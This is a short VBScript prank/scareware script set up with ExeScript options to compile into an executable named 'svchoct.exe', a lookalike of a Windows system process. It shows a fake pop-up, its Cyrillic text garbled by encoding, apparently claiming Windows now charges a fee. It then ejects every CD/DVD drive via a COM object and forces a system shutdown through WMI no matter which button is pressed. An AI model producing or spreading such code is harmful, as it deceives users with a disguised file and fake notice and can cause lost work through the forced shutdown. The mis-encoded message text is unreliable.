
' ----- ExeScript Options Begin -----
' ScriptType: window,activescript,invoker
' DestDirectory: current
' Icon: default
' OutputFile: F:\������������� ��������\������� visual basic\svchoct.exe
' 32Bit: yes
' ----- ExeScript Options End -----
If MsgBox("� ����� � �������������� ������������� �� ������ � Microsoft Windows � 1.02.2013 ������������ �� ������� ������. ��������� 1 ������ ������ - 50 ������. ����������?", vbYesNo Or vbExclamation) = vbYes Then   

Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection

if colCDROMs.Count >= 1 then
	For i = 0 to colCDROMs.Count - 1
		colCDROMs.Item(i).Eject
Next ' cdrom
	End If

MsgBox "������� ������ � DVD-������ � ��������, ������� ��", vbInformation  
msgbox "�� �� � �� ������� ������, ���!!!", vbCritical
Set OpSysSet = GetObject("winmgmts:{(Shutdown)}//./root/cimv2").ExecQuery("select * from Win32_OperatingSystem where Primary=true")  
 for each OpSys in OpSysSet 
 OpSys.ShutDown() 
 next   
Else   
MsgBox "�������, ����� ����� ������, �������! ;-)", vbExclamation

Set OpSysSet = GetObject("winmgmts:{(Shutdown)}//./root/cimv2").ExecQuery("select * from Win32_OperatingSystem where Primary=true")  
 for each OpSys in OpSysSet 
 OpSys.ShutDown() 
 next 
 
End If  